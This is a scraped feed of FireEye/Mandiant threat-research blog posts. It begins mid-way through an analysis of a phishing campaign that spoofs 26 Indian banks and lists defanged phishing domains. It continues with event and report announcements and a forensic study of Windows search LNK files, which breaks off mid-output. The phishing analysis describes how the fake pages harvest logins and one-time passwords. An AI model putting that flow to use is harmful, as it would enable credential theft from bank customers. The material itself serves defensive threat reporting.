bank they selected, which requests that they log in using their user name and password. Figure 3 shows a fake login page for State Bank of India. See the Appendix for more banks that have spoofed login pages.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig3.png\" /></p> \n<p> <span class=\"type-XS\">Figure 3: Fake login page for State Bank of India</span></p> \n<p>After entering their login credentials, the victim will be asked to key in their One Time Password (OTP), as seen in Figure 4.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig4.png\" /></p> \n<p> <span class=\"type-XS\">Figure 4: OTP being requested</span></p> \n<h4>Step 4</h4> \n<p>URL: hxxp://csecurepay[.]com/Final.aspx</p> \n<p>Once all of the sensitive data is gathered, a fake failed login message will be displayed to the victim, as seen in Figure 5.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig5.png\" /></p> \n<p> <span class=\"type-XS\">Figure 5: Fake error message being displayed</span></p> \n<h4>Credit and Debit Card Phishing Website</h4> \n<p>Using the registrant information from the csecurepay domain, we found another domain registered by the phisher as “nsecurepay[.]com”. The domain, registered in latest August 2016, aims to steal credit and debit card information.</p> \n<p>The following are among the list of cards that are targeted:</p> \n<p>1.&nbsp;&nbsp;&nbsp;&nbsp; ICICI Credit Card</p> \n<p>2.&nbsp;&nbsp;&nbsp;&nbsp; ICICI Debit Card</p> \n<p>3.&nbsp;&nbsp;&nbsp;&nbsp; Visa/Master Credit Card</p> \n<p>4.&nbsp;&nbsp;&nbsp;&nbsp; Visa/Master Debit Card</p> \n<p>5.&nbsp;&nbsp;&nbsp;&nbsp; SBI Debit Card Only</p> \n<p>At the time of this writing, the nsecurepay website was producing errors when redirecting to spoofed credit and debit card pages. Figure 6 shows the front end.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig6.png\" /></p> \n<p> <span class=\"type-XS\">Figure 6: Nsecurepay front end</span></p> \n<h3>Conclusion</h3> \n<p>Phishing has its own development lifecycle. It usually starts off with building the tools and developing the “hooks” for luring victims into providing their financial information. Once the phishing website (or websites) is fully operational, we typically begin to see a wave of phishing emails pointing to it.</p> \n<p>In this case, we see that phishing websites have been crafted to spoof multiple banks in India. These attackers can potentially grab sensitive online banking information and other personal data, and even provided support for multifactor authentication and OTP. Moreover, disguising the initial&nbsp;presentation to appear as an online payment gateway service makes the phishing attack seem more legitimate.</p> \n<p>FireEye Labs detects this phishing attack and customers will be protected against the usage of these sites in possible future campaigns.</p> \n<h3>Appendix</h3> \n<p>Fake login pages were served for 26 banks. The following is a list of some of the banks:</p> \n<p>-Bank of Baroda - Corporate</p> \n<p>-Bank of Baroda - Retail</p> \n<p>-Bank of Maharashtra</p> \n<p>-HDFC Bank</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig7.png\" /></p> \n<p> <span class=\"type-XS\">Figure 7: HDFC Bank fake login page</span></p> \n<p>-ICICI Bank</p> \n<p>-IDBI Bank</p> \n<p>-Indian Bank</p> \n<p>-IndusInd Bank</p> \n<p>-Jammu and Kashmir Bank</p> \n<p>-Kotak Bank</p> \n<p>-Lakshmi Vilas Bank - Corporate</p> \n<p>-Lakshmi Vilas Bank - Retail</p> \n<p>-State Bank of Hyderabad</p> \n<p>-State Bank of India</p> \n<p>-State Bank of Jaipur</p> \n<p>-State Bank of Mysore</p> \n<p>-State Bank of Patiala</p> \n<p>-State Bank of Bikaner</p> \n<p>-State Bank of Travancore</p> \n<p>-Tamilnad Mercantile Bank</p> \n<p>-United Bank of India</p>","descriptionType":"html","publishedDate":"Wed, 30 Nov 2016 17:13:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig1.png","linkMd5":"62f8bd64d29dca9e94de3405243ee4c2","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn23@2020_3/2020/08/24/14-11-04-928_583daef27ed64f31.webp","destWidth":633,"destHeight":535,"sourceBytes":205419,"destBytes":17332,"author":"Santhosh Ramanchandran","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig1.png":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn23@2020_3/2020/08/24/14-11-04-928_583daef27ed64f31.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig2.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn81@2020_6/2020/08/24/14-11-14-393_268113c2067b677f.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig3.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn94@2020_1/2020/08/24/14-11-14-759_61143fd927fdbc62.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig4.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn5@2020_6/2020/08/24/14-11-14-390_88d1a300780aaa8e.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig5.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn95@2020_4/2020/08/24/14-11-13-044_05af24ec13ab8a83.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig6.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn23@2020_6/2020/08/24/14-11-12-096_55cf7366ec0ccb48.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig7.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn23@2020_1/2020/08/24/14-11-10-944_98bd7b691a4f7637.webp"},"publishedOrCreatedDate":1598278264197},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Executive Briefing in New York with Former Secretary of Homeland\nSecurity Michael Chertoff","link":"http://www.fireeye.com/blog/threat-research/2012/04/executive-briefing-york-secretary-homeland-security.html","description":"<div class=\"c00 c00v1\"> \n <p>On March 15, Mandiant hosted an executive briefing over breakfast in New York City. The location in the W Hotel in Downtown NYC overlooked the 9/11 Memorial and the rising One World Trade Center-an arresting view and a unique setting for this event.</p> \n <p>Former Secretary of Homeland Security Michael Chertoff kicked off the morning by discussing his perspective on the global threat landscape. He touched on Iran's cyber warfare capabilities in particular. He remarked on recent alleged Iranian attacks against the BBC and said that there is no point in debating the reality of <a href=\"http://www.bbc.co.uk/news/technology-17365416\">cyber war</a>. If one side believes they are engaged in such a battle, then that is reality-and \"Iran clearly believes they are already participants in cyber war.\" He also noted that Iran's capabilities are already quite advanced. After being hit by Stuxnet, Iran views it as imperative to be prepared to respond in kind.</p> \n <p>It is always nice to see someone like Mr. Chertoff connecting the dots so articulately on a technical level. At one point, he commented about how important it was to not just look for malware. Smart responders, he said, need to look for all trace evidence of compromise in order to fully understand the scope of an incident. Coincidentally, this is trend #1 in our recent <a href=\"https://www2.fireeye.com/WEB-2012-MNDT-RPT-M-Trends-2012_LP.html\">M-Trends report</a>, and Mr. Chertoff described the problem with a malware-centric approach perfectly.</p> \n <p>Richard Bejtlich spoke next and used a role-playing exercise to help the audience understand the challenge of responding to targeted threats. His premise was simple: \"Pretend I'm a law enforcement agent who comes to your office and tells you that you are compromised, and that I have your own internal documents as evidence. What do you do next?\"</p> \n <p>This provoked discussion and the audience started asking questions about the nature of the intrusion and what they should do to respond. As we explored the scenario through Q&amp;A, it became clear that most organizations lack the visibility they need to adequately respond to attacks. What about your organization? If you found out today that you had been the victim of a substantial breach, where would you look first? How would you validate the intrusion? How could you discover the scopeor identify what had been stolen?</p> \n <p>Those of you who have attended Mandiant events know that we are pretty light on the product pitches (we often don't mention our products at all). However, we do have a product that helps answer the questions that Richard was posing. <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/incident-response.html\">Mandiant Intelligent Response</a> has helped hundreds of companies answer the question \"Now What??\" when they are on the receiving end of the scenario Richard outlined in New York.</p> \n</div>","descriptionType":"html","publishedDate":"Mon, 02 Apr 2012 22:17:49 +0000","feedId":1226,"bgimg":"","linkMd5":"8c6771394a28d34ec385135c1aafe976","bgimgJsdelivr":"","metaImg":"","author":"Grady Summers","publishedOrCreatedDate":1598278264214},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"M-Trends 2020: Insights From the Front Lines","link":"http://www.fireeye.com/blog/threat-research/2020/02/mtrends-2020-insights-from-the-front-lines.html","description":"<p>Today we release <i> <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/current-threats/annual-threat-report/mtrends.html\">M-Trends 2020</a></i>, the 11<sup>th</sup> edition of our popular annual FireEye Mandiant report. This latest <i>M-Trends</i> contains all of the statistics, trends, case studies and hardening recommendations that readers have come to expect through the years—and more.</p> \n<p>One of the most exciting takeaways from this year’s report: the global median dwell time is now 56 days. That means the average attacker is going undetected on a network for under two months—an <i>M-Trends</i> first. This is a very promising statistic that demonstrates how far we’ve come since 2011 when the global median dwell time was 416 days. And yet, we know a sophisticated attacker needs only a few days to gain access to the crown jewels, so there is still plenty of room for improvement.</p> \n<p>Another interesting statistic in the report is what we refer to as \"detection by source.\" For the first time since 2015, the majority of organizations are being notified of compromises by external sources (53 percent) over internal teams (47 percent). This is more likely due to factors such as increases in law enforcement notifications and compliance changes, and less likely due to internal teams having lost a step.</p> \n<p>There’s a whole lot more to look forward to in <i>M-Trends 2020</i>, including:</p> \n<ul> \n <li> <b>By the Numbers</b>: Global median dwell time and detection by source are just the tip of the iceberg—we share a number of other statistics related to targeted industries, malware, threat techniques and more.</li> \n <li> <b>Newly Named APT Groups</b>: Learn all about APT41, group responsible for carrying out Chinese state-sponsored espionage and financially motivated activity since as far back as 2012.</li> \n <li> <b>Trends</b>: We take a deep dive into the latest trends involving malware families, monetizing ransomware, crimeware as a service, and malicious insiders.</li> \n <li> <b>Case Studies</b>: With so many organizations moving to the cloud, we take a look at a breach involving cloud assets. We also take readers through a campaign where attackers were targeting gift cards.</li> \n</ul> \n<p>While <i>M-Trends 2020</i> contains plenty of new information, the goal of <i>M-Trends</i> has remained the same since the beginning: to arm security professionals with details on the latest attacks and threats we are seeing during our engagements.</p> \n<p> <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/current-threats/annual-threat-report/mtrends.html\">Download the 11<sup>th</sup> edition of M-Trends today</a>.</p>","descriptionType":"html","publishedDate":"Thu, 20 Feb 2020 13:00:00 +0000","feedId":1226,"bgimg":"","linkMd5":"9039e22ec22b4f575b1303319929640a","bgimgJsdelivr":"","metaImg":"","author":"Jurgen Kutscher","publishedOrCreatedDate":1598278264188},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Memoryze for the Mac: Support Added for OS X Mountain Lion (10.8)","link":"http://www.fireeye.com/blog/threat-research/2012/11/memoryze-mac-support-added-os-mountain-lion-108.html","description":"<div class=\"c00 c00v1\"> \n <p>Earlier this year, Mandiant launched a new freeware tool: <a href=\"http://www.fireeye.com/content/fireeye-www/site-content/en_US/retired-pages-do-not-activate/memoryze-for-the-mac.html\">Memoryze for the Mac™</a>. The tool brings many of the features of <a target=\"_blank\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/memoryze.html\">Memoryze</a>™<sup> </sup>to the Apple<sup>®</sup> Macintosh platform, enabling acquisition of memory images via the command-line or a simple GUI. We are excited to announce it now fully supports OS X 10.6-10.8. <br /> </p> \n <p>Recently, OS X Mountain Lion added kernel Address Space Layout Randomization. It is a welcome security feature, raising the bar for kernel exploitation. This feature adds an extra step into the memory analysis tool. Previously, we could depend on the paging table IdlePML4 and IdlePDPT addresses being at the same physical memory location. With 10.8 and KASLR the physical memory addresses of IdlePML4 and IdlePDPT became BootPML4 and BootPDPT, while IdlePML4 and IdlePDPT are now randomized with ASLR. The boot paging tables do not contain the full kernel virtual memory layout. Since Memoryze for Mac does not depend on any symbol information, we developed a mechanism to uniformly discover the randomized location of the kernel paging tables.</p> \n <p>Once again, Mountain Lion has changed the memory location of nsysent. Prior to the change, it was located directly after the sysent table itself. As documented in several locations on the web, this made automated discovery and verification of the table size convenient. Unfortunately, Apple decided to move the location of nsysent, causing us to develop a new sysent size discovery mechanism.</p> \n <p>We have a growing list of cool new features to add to Memoryze for Mac, but it may be until after the new year before we are able to dev the features.</p> \n</div>","descriptionType":"html","publishedDate":"Fri, 09 Nov 2012 02:05:27 +0000","feedId":1226,"bgimg":"","linkMd5":"d45907a09e6b807452a6ffe9ed61fe24","bgimgJsdelivr":"","metaImg":"","author":"Seth and Steve Davis","publishedOrCreatedDate":1598278264211},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"The Missing LNK — Correlating User Search LNK files","link":"http://www.fireeye.com/blog/threat-research/2020/02/the-missing-lnk-correlating-user-search-lnk-files.html","description":"<p>Forensic investigators use LNK shortcut files to recover metadata\n  about recently accessed files, including files deleted after the time\n  of access. In a recent investigation, FireEye Mandiant encountered LNK\n  files that indicated an attacker accessed files included in Windows\n  Explorer search results. In our experience, this was a new combination\n  of forensic artifacts. We’re excited to share our findings because\n  they help to paint a more complete picture of an attacker’s actions\n  and objectives on targeted systems. Further, these findings can also\n  be leveraged for insider threat cases to determine the path used to\n  locate and subsequently open a file.</p>\n <h4>Windows LNK Format</h4>\n <p>The <span class=\"code\">.lnk</span> extension is associated with a\n  class of files known as Shell Items. These binary format files contain\n  information that can be used to access other data objects in the\n  Windows shell <a\n    href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943\">(the\n    graphical user interface)</a>.</p>\n <p>LNK shortcut files are one type of Shell Item. They are created by\n  the Windows operating system automatically when a user accesses a file\n  from a supported application but can also be created by the user\n  manually. LNK shortcut files typically contain metadata about the\n  accessed file, including the file name and size, the original path,\n  timestamps, volume and system information (ex. drive type and system\n  hostname), and network information (ex. network share path).\n  Fortunately, there are tools available that can parse these files.\n  While internally at Mandiant we leverage FireEye Endpoint Security to\n  parse LNK files and identify suspicious user search terms, for the\n  purposes of this blog post we will be using <a\n  href=\"https://github.com/EricZimmerman/LECmd\">LECmd</a> by Eric\n  Zimmerman. Figure 1 shows the command line options for <span class=\"code\">LECmd.exe</span>.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/lnk/Picture1.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 1: LECmd.exe command line options</span></p>\n <p>Parsed metadata within LNK shortcut files is relevant to forensic\n  investigations for multiple use cases, including profiling user\n  activity on a system or searching for references to malware that has\n  since been deleted.</p>\n <h4>User Search LNK files</h4>\n <p>Recently, Mandiant encountered LNK files whose format we did not\n  initially recognize. The files came from a Windows Server 2012 R2\n  system and had paths like those shown in Figure 2. We guessed that\n  they were LNK shortcut files based on their extension and file path;\n  however, their content was not familiar to us.</p>\n <table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> <tbody>\n    <tr>\n      <td><p>\n          <span\n        class=\"code\">C:\\Users\\&lt;user&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\passw.lnk</span></p> <p>\n          <span\n        class=\"code\">C:\\Users\\&lt;user&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\gov.lnk</span></p>\n      </td> </tr></tbody></table>\n <p>\n  <span class=\"type-XS\">Figure 2: Full file path of the unfamiliar LNK files</span></p>\n <p>In the previous examples, a forensic investigator would use the LNK\n  shortcut filename to conclude that a user opened a file named <span\n  class=\"code\">passw</span> or <span class=\"code\">gov</span>. Then, they\n  would use a tool like <span class=\"code\">LECmd</span> to recover\n  additional metadata. This would provide them with the full file path\n  of the accessed file and the timestamps of the file at the time it was\n  accessed - among other forensic information.</p>\n <p>However, the previous LNK files did not reveal expected metadata.\n  Figure 3 shows the output of <span class=\"code\">LECmd</span> for <span\n  class=\"code\">passw.lnk</span> (some information omitted for clarity).</p>\n <table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> <tbody>\n    <tr>\n      <td><p>\n          <span class=\"code\">LECmd version 1.3.2.1</span></p> <p>\n          <span class=\"code\">Author: Eric Zimmerman\n            (saericzimmerman@gmail.com)<br />\n        https://github.com/EricZimmerman/LECmd</span></p> <p>\n          <span class=\"code\">--- Header ---<br />    <u>Target\n              created:<br />  </u>  <u>Target modified:<br />  </u> \n              <u>Target accessed:</u></span></p> <p>\n          <span class=\"code\">  <u>File size: 0</u>\n            <br />    Flags: HasTargetIdList, IsUnicode,\n            DisableKnownFolderTracking<br />    File attributes: 0<br />\n              Icon index: 0<br />    Show window: SwNormal (Activates\n            and displays the window. The window is restored to its\n            original size and position if the window is minimized or\n        maximized.)</span></p> <p>\n          <span class=\"code\">--- Target ID information (Format: Type\n            ==&gt; Value) ---</span></p> <p>\n          <span class=\"code\">  Absolute path: <u>Search\n        Folder\\passw</u></span></p> <p>\n          <span class=\"code\">  -Users property view ==&gt; Search\n            Folder<br />    &gt;&gt; Property store (Format: GUID\\ID\n            Description ==&gt; Value)<br />     \n             d5cdd505-2e9c-101b-9397-08002b2cf9ae\\AutoList  ==&gt;\n            VT_STREAM not implemented (yet) See extension block section\n            for contents for now<br />     \n             d5cdd505-2e9c-101b-9397-08002b2cf9ae\\AutolistCacheTime\n             ==&gt; 1849138729510<br />     \n             d5cdd505-2e9c-101b-9397-08002b2cf9ae\\AutolistCacheKey\n             ==&gt; <u>Search Results in Local Disk (C:)</u>0</span></p> <p>\n          <span class=\"code\">  -Variable: Users property view ==&gt;\n            passw<br />    &gt;&gt; Property store (Format: GUID\\ID\n            Description ==&gt; Value)<br />     \n             1e3ee840-bc2b-476c-8237-2acd1a839b22\\2      (Description\n            not available)         ==&gt; VT_STREAM not\n            implemented<br />     \n             1e3ee840-bc2b-476c-8237-2acd1a839b22\\8      (Description\n            not available)         ==&gt; passw<br />     \n             28636aa6-953d-11d2-b5d6-00c04fd918d0\\11     Item Type      \n                                ==&gt; Stack<br />     \n             28636aa6-953d-11d2-b5d6-00c04fd918d0\\25     SFGAO Flags    \n                                ==&gt; 805306372<br />     \n             b725f130-47ef-101a-a5f1-02608c9eebac\\10     Item Name\n            Display                   ==&gt; passw</span></p> <p>\n          <span class=\"code\">--- End Target ID information\n        ---</span></p> <p>\n          <span class=\"code\">--- Extra blocks information ---</span></p> <p>\n          <span class=\"code\">&gt;&gt; Property store data block (Format:\n            GUID\\ID Description ==&gt; Value)<br />     (Property store\n            is empty)</span></p> </td> </tr></tbody></table>\n <p>\n  <span class=\"type-XS\">Figure 3: LECmd.exe output for passw.lnk</span></p>\n <p>Of note, none of the expected information for LNK shortcut files is\n  present. However, there were strings of interest in the Target ID\n  Information section including <span class=\"code\">Search\n  Folder\\passw</span> as well as <span class=\"code\">Search Results in\n    Local Disk (C:)</span>. For comparison, Figure 4 highlights output\n  for a standard LNK shortcut file using a test file. Notice that the\n  target file timestamps, file size, full file path, and other expected\n  file metadata are present (some information omitted for clarity).</p>\n <table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> <tbody>\n    <tr>\n      <td><p>\n          <span class=\"code\">LECmd version 1.3.2.1</span></p> <p>\n          <span class=\"code\">Author: Eric Zimmerman\n            (saericzimmerman@gmail.com)<br />\n        https://github.com/EricZimmerman/LECmd</span></p> <p>\n          <span class=\"code\">--- Header ---<br />    <u>Target created: \n              2020-01-21 19:34:28<br />  </u>  <u>Target modified:\n              2020-01-21 19:34:28<br />  </u>  <u>Target accessed:\n              2020-01-22 21:25:12</u></span></p> <p>\n          <span class=\"code\">  <u>File size: 4</u>\n            <b>\n              <br /> </b>   Flags: HasTargetIdList, HasLinkInfo,\n            HasRelativePath, HasWorkingDir, IsUnicode,\n            DisableKnownFolderTracking<br />    File attributes:\n            FileAttributeArchive<br />    Icon index: 0<br />    Show\n            window: SwNormal (Activates and displays the window. The\n            window is restored to its original size and position if the\n            window is minimized or maximized.)</span></p> <p>\n          <span class=\"code\">Relative Path:\n            ..\\..\\..\\..\\..\\Desktop\\test.txt<br />  <u>Working Directory:\n        C:\\Users\\&lt;username&gt;\\Desktop</u></span></p> <p>\n          <span class=\"code\">\n            <u>--- Link information ---</u>\n            <br />  Flags: VolumeIdAndLocalBasePath</span></p> <p>\n          <span class=\"code\">\n            <u>&gt;&gt;Volume information</u>\n            <br />    Drive type: Fixed storage media (Hard drive)<br />\n              Serial number: &lt;serial number&gt;<br />    Label:\n            OSDisk<br />    <u>Local path:\n        C:\\Users\\&lt;username&gt;\\Desktop\\test.txt</u></span></p> <p>\n          <span class=\"code\">--- Target ID information (Format: Type\n            ==&gt; Value) ---<br />    Absolute path: My\n        Computer\\Desktop\\test.txt</span></p> <p>\n          <span class=\"code\">  -Root folder: GUID ==&gt; My\n        Computer</span></p> <p>\n          <span class=\"code\">  -Root folder: GUID ==&gt;\n        Desktop</span></p> <p>\n          <span class=\"code\">  <u>-File ==&gt; test.txt</u>\n            <br />      Short name: test.txt<br />      Modified:\n            2020-01-21 19:34:30<br />      Extension block count:\n        1</span></p> <p>\n          <span class=\"code\">    --------- Block 0 (Beef0004)\n            ---------<br />      Long name: test.txt<br />      Created:\n            2020-01-21 19:34:30<br />      Last access: 2020-01-21\n            19:34:32<br />      MFT entry/sequence #: 108919/8\n        (0x1A977/0x8)</span></p> <p>\n          <span class=\"code\">--- End Target ID information\n        ---</span></p> <p>\n          <span class=\"code\">--- Extra blocks information ---</span></p> <p>\n          <span class=\"code\">\n            <u>&gt;&gt; Tracker database block</u>\n            <br />     Machine ID: &lt;hostname&gt;<br />     MAC\n            Address: &lt;mac address&gt;<br />     MAC Vendor:\n            INTEL<br />     Creation: 2020-01-21 15:19:59</span></p> <p>\n          <span class=\"code\">   Volume Droid: &lt;volume&gt;<br />   \n             Volume Droid Birth: &lt;volume&gt;<br />     File Droid:\n            &lt;file&gt;<br />     File Droid birth:\n        &lt;file&gt;</span></p> </td> </tr></tbody></table>\n <p>\n  <span class=\"type-XS\">Figure 4: LECmd.exe output for standard LNK\n    shortcut file test.txt</span></p>\n <p>Fortunately, during the investigation we also parsed the user’s\n    <span class=\"code\">NTUSER.DAT</span> registry file (using Harlan\n  Carvey’s <a\n  href=\"https://code.google.com/archive/p/regripper/downloads\">RegRipper</a>)\n  and reviewed the <span class=\"code\">WorldWheelQuery</span> key which\n  details user Explorer search history. The <span\n  class=\"code\">passw.lnk</span> file suddenly became more interesting!\n  Figure 5 shows the entries parsed from the registry key. Note that the\n  search history includes the same term we observed in the LNK file:\n    <span class=\"code\">passw</span>.</p>\n <table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> <tbody>\n    <tr>\n      <td><p>\n          <span class=\"code\">wordwheelquery v.20100330<br />\n            (NTUSER.DAT) Gets contents of user's WordWheelQuery\n        key</span></p> <p>\n          <span\n            class=\"code\">Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery<br />\n            LastWrite Time Wed Nov 13 06:51:46 2019 (UTC)</span></p> <p>\n          <span class=\"code\"> Searches listed in MRUListEx\n        order</span></p> <p>\n          <span class=\"code\">14   Secret                         <br />\n              <u>6    passw</u>                         <br />  13   ccc\n                                      <br />  12   bbb                  \n                    <br />  11   aaa                           <br />\n            10   *.cfg                         <br />  9    apple      \n                              <br />  8    dni                        \n              <br />  7    private                         <br />  4  \n             gov                           <br />  5    air            \n                          <br />  3    intelsat                    \n             <br />  2    adhealthcheck                 <br />  1  \n             *.ps1                         <br />  0  \n         global</span></p> </td> </tr></tbody></table>\n <p>\n  <span class=\"type-XS\">Figure 5: WorldWheelQuery key extracted from the\n    user’s NTUSER.DAT registry file</span></p>\n <p>Via the <span class=\"code\">WorldWheelQuery</span> registry key, we\n  identified <span class=\"code\">passw</span> as the second most recent\n  term in the user’s Explorer search history according to the <span\n  class=\"code\">MRUListEx</span> order. <span\n  class=\"code\">MRUListEx</span> is a registry value that lists the order\n  in which other values have most recently been accessed—essentially,\n  the order in which terms were searched in Explorer. <span\n  class=\"code\">passw</span> also matched the filename of the unusual LNK\n  file that contained the string <span class=\"code\">Search Results in\n    Local Disk (C:)</span> (see Figure 3). These details seemed to\n  suggest that LNK files were being created as a result of user Explorer\n  searches. Therefore, we’ve started calling these “user search LNK files”.</p>\n <h4>Nuance and Interpretation</h4>\n <p>After searching the system for LNK files with the terms listed in\n  the user’s Explorer search history, we found that not all terms had\n  associated user search LNK files. Figure 6 displays LNK files and\n  their accompanying file creation and modification timestamps that we\n  identified as a result of this search. Note that while we found 15\n  searches via the <span class=\"code\">WorldWheelQuery</span> registry\n  key, there are only four (4) user search LNK files.</p>\n <table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> <tbody>\n    <tr>\n      <td><p>\n          <span class=\"code\">2019-11-09 08:33:14    Created\n            Modified<br />\n        C:\\Users\\&lt;user&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\gov.lnk</span></p> <p>\n          <span class=\"code\">2019-11-09 09:29:11    Created<br />\n            2019-11-09 09:29:37    Modified<br />\n        C:\\Users\\&lt;user&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\private.lnk</span></p> <p>\n          <span class=\"code\">2019-11-09 08:38:29    Created<br />\n            2019-11-13 06:47:56    Modified<br />\n        C:\\Users\\&lt;user&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\passw.lnk</span></p> <p>\n          <span class=\"code\">2019-11-13 06:57:03    Created<br />\n            2019-11-13 06:57:25    Modified<br />\n        C:\\Users\\&lt;user&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\Secret.lnk</span></p>\n      </td> </tr></tbody></table>\n <p>\n  <span class=\"type-XS\">Figure 6: LNK files with associated\n    WorldWheelQuery Explorer search terms</span></p>\n <p>Additionally, we noticed pairs of LNK files created at the <b>same\n  time</b> that had similar names. As an example, Figure 7 lists two LNK\n  files that were both created at 2019-11-09 08:38:29 UTC.</p>\n <table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> <tbody>\n    <tr>\n      <td><p>\n          <span\n        class=\"code\">C:\\Users\\&lt;user&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\<u>passw</u>.lnk</span></p> <p>\n          <span\n        class=\"code\">C:\\Users\\&lt;user&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\<u>passw</u>ord.lnk</span></p>\n      </td> </tr></tbody></table>\n <p>\n  <span class=\"type-XS\">Figure 7: LNK files created at the same time</span></p>\n <p>After further testing, we determined that the system created user\n  search LNK files as a result of Explorer searches where the user\n  <b>opened</b> one of the files produced as a result of this search.\n  User search LNK files were <b>not</b> created if the user <b>did not\n  open</b> a file returned by the search.</p>\n <p>In this example, the <span class=\"code\">password.lnk</span> file\n  contained target file metadata, as would be expected for LNK shortcut\n  files, and referenced a target file named <span\n  class=\"code\">password.txt</span> located in the <span\n  class=\"code\">T:\\</span> directory. <span\n  class=\"code\">passw.lnk</span>, as previously discussed, only contained\n  expected metadata for a user search LNK file, including the absolute\n  path <span class=\"code\">Search Folder\\passw</span> with reference to\n    <span class=\"code\">Search Results in Local Disk (C:)</span>.\n  However, this discrepancy in directory—the user search LNK file search\n  context of <span class=\"code\">Search Results in Local Disk (C:)</span>\n  and the LNK shortcut file located in the <span class=\"code\">T:\\</span>\n  drive—is actually as expected.</p>\n <p>LNK shortcut files contain metadata for the most recently accessed\n  file, and we found the same to be true for user search LNK files.\n  Based on differing creation and modification timestamps for <span\n  class=\"code\">passw.lnk</span>, we know the user searched for <span\n  class=\"code\">passw</span> in at least one other instance (we’re not\n  able to conclude whether a search happened between these two points in\n  time) and opened a file from the search results. This is seen in the\n  timestamps for the <span class=\"code\">passw</span> user search LNK\n  file in Figure 8.</p>\n <table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> <tbody>\n    <tr>\n      <td><span class=\"code\">2019-11-09 08:38:29    Created<br />\n          2019-11-13 06:47:56    Modified<br />\n      C:\\Users\\&lt;user&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\passw.lnk</span></td> </tr></tbody></table>\n <p>\n  <span class=\"type-XS\">Figure 8: passw.lnk creation and modification timestamps</span></p>\n <p>The second occurrence of a search for <span\n  class=\"code\">passw</span> occurred on November 13, 2019. In this\n  instance, the user again searched for the term <span\n  class=\"code\">passw</span> using Windows Explorer search, but this time\n  searched within the context of the <span class=\"code\">C:\\</span> drive\n    (<span class=\"code\">Search Results in Local Disk (C:)</span>), and\n  subsequently clicked on a document named <span\n  class=\"code\">password2.txt</span>. The results from <span\n  class=\"code\">LECmd</span> for <span class=\"code\">password2.lnk</span>\n  can be seen in Figure 9 (some information omitted for clarity and to\n  protect client information). Notice the information embedded in user\n  search LNK files is <b>also</b> embedded within the LNK shortcut file\n  that is created simultaneously with the user search LNK file\n  (underlined text). The search context for <span\n  class=\"code\">passw.lnk</span> and full file path location for <span\n  class=\"code\">password2.lnk</span> both match: <span class=\"code\">C:\\</span>.</p>\n <table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> <tbody>\n    <tr>\n      <td><p>\n          <span class=\"code\">LECmd version 1.3.2.1</span></p> <p>\n          <span class=\"code\">Author: Eric Zimmerman\n            (saericzimmerman@gmail.com)<br />\n        https://github.com/EricZimmerman/LECmd</span></p> <p>\n          <span class=\"code\">--- Header ---<br />    Target created:\n             2015-11-09 22:14:10<br />    Target modified: 2010-01-11\n            16:57:11<br />    Target accessed: 2015-11-09\n        22:14:10</span></p> <p>\n          <span class=\"code\">  File size: 19<br />    Flags:\n            HasTargetIdList, HasLinkInfo, HasRelativePath,\n            HasWorkingDir, 